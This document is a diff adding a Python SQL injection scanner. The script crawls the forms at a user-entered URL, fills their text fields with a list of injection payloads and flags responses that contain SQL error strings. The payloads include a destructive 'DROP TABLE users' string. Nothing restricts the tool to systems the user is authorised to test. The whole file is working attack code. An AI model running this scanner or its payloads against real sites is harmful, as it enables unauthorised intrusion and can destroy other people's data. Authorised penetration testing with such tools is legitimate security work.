@@ -1,0 +1,64 @@
+import requests
+from bs4 import BeautifulSoup
+from urllib.parse import urljoin
+
+# Expanded list of common SQL injection payloads
+payloads = [
+
+    "'; DROP TABLE users; --",
+    "' UNION SELECT null, null, null --",
+    "' OR 'a'='a' --",
+    "1'or'1'='1'#",
+    "' AND 1=1 --",
+    "' OR 1=1 --",
+    "' OR 1=2 --",
+    "' AND 'x'='x' --"
+]
+
+# Function to scan a URL for SQL injection vulnerabilities
+def scan_url(url):
+    try:
+        print(f"Scanning {url} for SQL injection vulnerabilities...")
+        session = requests.Session()
+        response = session.get(url)
+        if response.status_code == 200:
+            soup = BeautifulSoup(response.text, 'html.parser')
+            forms = soup.find_all('form')
+            print(f"Found {len(forms)} form(s) on the page.")
+
+            for i, form in enumerate(forms):
+                action = form.get('action', '')
+                method = form.get('method', 'get').lower()
+                inputs = form.find_all(['input', 'textarea', 'select'])
+                target_url = urljoin(url, action)
+
+                print(f"\nTesting form {i + 1} ({target_url})...")
+                for payload in payloads:
+                    data = {}
+                    for input_tag in inputs:
+                        input_name = input_tag.get('name')
+                        input_type = input_tag.get('type', 'text')
+                        if input_name:
+                            data[input_name] = payload if input_type in ['text', 'textarea'] else input_tag.get('value', '')
+
+                    # Send the request with the payload
+                    if method == 'post':
+                        res = session.post(target_url, data=data)
+                    else:
+                        res = session.get(target_url, params=data)
+
+                    # Check for SQL error messages or unexpected responses
+                    if any(error in res.text.lower() for error in ["sql", "syntax error", "mysql", "database error", "warning"]):
+                        print(f"Potential vulnerability detected with payload: {payload}")
+                        break
+                else:
+                    print("No vulnerabilities detected in this form.")
+        else:
+            print(f"Failed to access {url}. Status code: {response.status_code}")
+    except Exception as e:
+        print(f"An error occurred: {e}")
+
+# Example usage
+if __name__ == "__main__":
+    target_url = input("Enter the URL to scan: ")
+    scan_url(target_url)
